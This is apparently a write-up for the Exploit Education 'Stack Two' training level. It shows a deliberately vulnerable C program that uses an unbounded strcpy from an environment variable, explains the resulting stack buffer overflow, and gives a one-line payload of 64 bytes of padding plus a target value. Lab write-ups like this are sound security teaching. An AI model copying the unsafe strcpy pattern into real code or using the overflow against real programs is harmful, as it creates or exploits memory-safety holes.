# Stack two

## Code

```c

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```
***

In this level we should overflow the buffer by setting the an enviroment variable to a specific value.

We can craft this payload, likewise, with a 64 character padding + the value `0x0d0a090a`

This works again because the function `strcpy` doesn't perform any bounds checking, therefore, leading to a buffer overflow due to the fixed size of `buffer`


## Solution


`export ExploitEducation=$(python -c "import struct; print('A'*64 + struct.pack('<I', 0x0d0a090a))")`
`./stack-two`





